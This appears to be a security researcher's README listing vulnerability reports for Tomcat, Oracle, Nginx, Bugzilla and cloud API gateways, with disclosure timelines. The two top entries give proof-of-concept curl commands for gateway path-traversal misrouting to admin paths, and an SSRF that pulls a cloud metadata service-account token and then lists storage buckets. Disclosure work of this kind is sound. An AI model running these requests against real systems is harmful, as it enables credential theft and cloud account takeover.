# cve

## 0x0D CVE-/-/ - Mis-routing in a top 5 Cloud Api Gateway service is a **Intended Behavior**?

**1-Line curl**, unauthenticated attacker could manipulate **Api Gateway Api-Routing to Full Application and Cloud Asset Takeover**

```bash
curl -i --path-as-is "https://<XXX>.execute-api.us-west-2.amazonaws.com/prod/public-api/health/<CRAFTED_URI>/<admin-api>/conf/secret.xml"
```

**WHAT HE CAN DO?**

```bash
curl -i --path-as-is "https://<XXX>.execute-api.us-west-2.amazonaws.com/prod/public-api/health/<CRAFTED_URI>/manager/html/"
# → SC 200
```

|Date|Status|Comment|
|:--:|:--:|:--:|
|Sep 16, 2025|Private|Reported to ****** Cloud Security Team via HackerOne|
|Sep 30, 2025|Private|Marked as 'Informative(Closed)'|

## 0x0C CVE-/-/ - Mis-routing in a top 5 Cloud Apigee service is a **Intended Behavior**?

**1-Line curl**, unauthenticated attacker could manipulate **Cloud Apigee Api-Routing to Full Application and Cloud Asset Takeover**

```bash
curl "https://<vulnerable-apigee-service>/<public-api>/<crafted-uri>/<admin-api>/diag-curl?url=http://metadata.******.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

**WHAT HE CAN DO?**

```bash
echo "--- 2A-ii. Proof of Confidentiality Breach: Listing Storage Buckets ---"

GET /storage/v1/b?project=${PROJECT_ID} HTTP/2
Host: storage.******apis.com
Authorization: Bearer ${ACCESS_TOKEN}
# → SC 200
```

|Date|Status|Comment|
|:--:|:--:|:--:|
|Oct 03, 2025|Private|Reported to ****** Cloud Security Team|
|Nov 05, 2025|Private|Marked as 'Won't fix (Intended behavior)'|

## 0x0B [CVE-2025-TBD](https://github.com/gregk4sec/cve) - Oracle Fusion OHS Path Traversal
|Date|Status|Comment|
|:--:|:--:|:--:|
|Nov 11, 2025|Private|Reported to Oracle security team|
|Nov 13, 2025|Private|Behavior confirmed|

## 0x0A [CVE-2025-TBD](https://github.com/gregk4sec/cve) - Oracle Wildfly Path Traversal
|Date|Status|Comment|
|:--:|:--:|:--:|
|Nov 11, 2025|Private|Reported to Wildfly security team|
|Nov 12, 2025|Private|Behavior confirmed|

## 0x09 [CVE-2025-55668](https://github.com/gregk4sec/CVE-2025-55668) - Tomcat - Session fixation via rewrite valve
|Date|Status|Comment|
|:--:|:--:|:--:|
|May 30, 2025|Private|Reported to tomcat security team|
|Aug 13, 2025|Public|Published|

## 0x08 [TBD](https://github.com/gregk4sec/TBD) - Nginx Path Traversal
|Date|Status|Comment|
|:--:|:--:|:--:|
|July 4, 2025|Private|Reported to Nginx Github Security|

## 0x07 [CVE-2025-44160](https://github.com/gregk4sec/TBD) - WebDAV DoS
|Date|Status|Comment|
|:--:|:--:|:--:|
|Feb, 2025|Private|Reported to Vendor Jira|
|Mar 13, 2025|Private|Reported to CVE.org|
|Jun 26, 2025|Private|Confirmed with CVE Number|

## 0x06 [CVE-2025-?](https://github.com/gregk4sec/TBD) - Bugzilla - TBD
|Date|Status|Comment|
|:--:|:--:|:--:|
|Jun 20, 2025|Private|Reported to mozilla-bugzilla security team|

## 0x05 [CVE-2025-49125](https://github.com/gregk4sec/CVE-2025-49125) - Tomcat - Security constraint bypass for pre/post-resources
|Date|Status|Comment|
|:--:|:--:|:--:|
|May 30, 2025|Private|Reported to tomcat security team|
|Jun 16, 2025|Public|Published|

## 0x04 [CVE-2025-46701](https://github.com/gregk4sec/CVE-2025-46701) - Tomcat - CGI security constraint bypass
|Date|Status|Comment|
|:--:|:--:|:--:|
|Apr 09, 2025|Private|Reported to tomcat security team|
|May 29, 2025|Public|Published|

## 0x03 [CVE-2025-31651](https://github.com/gregk4sec/CVE-2025-31651) - Tomcat - Rewrite rule bypass
|Date|Status|Comment|
|:--:|:--:|:--:|
|Feb 28, 2025|Private|Reported to tomcat security team|
|Apr 28, 2025|Public|Published|

## 0x02 [CVE-2025-PoC-Tomcat-DoS-0314](https://github.com/gregk4sec/CVE-2025-PoC-Tomcat-DoS-0314)

## 0x01 [CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813) - Tomcat - Potential RCE and/or information disclosure and/or information corruption with partial PUT
|Date|Status|Comment|
|:--:|:--:|:--:|
|Jan 13, 2025|Private|Reported to tomcat security team|
|Mar 10, 2025|Public|Published|
